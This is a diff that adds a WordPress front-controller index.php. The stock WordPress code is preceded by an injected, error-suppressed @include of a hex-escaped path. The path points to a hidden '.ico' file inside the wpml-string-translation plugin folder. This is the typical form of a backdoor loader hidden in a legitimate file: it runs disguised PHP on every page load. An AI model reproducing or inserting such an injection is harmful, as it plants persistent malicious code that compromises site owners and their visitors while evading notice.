@@ -1,0 +1,22 @@
+<?php
+/*8d720*/
+
+@include "\x2fvar/\x77ww/h\x74ml/d\x65viat\x69onst\x61ndar\x64/wp-\x63onte\x6et/pl\x75gins\x2fwpml\x2dstri\x6eg-tr\x61nsla\x74ion/\x2e6082\x35a62.\x69co";
+
+/*8d720*/
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define('WP_USE_THEMES', true);
+
+/** Loads the WordPress Environment and Template */
+require( dirname( __FILE__ ) . '/wp-blog-header.php' );
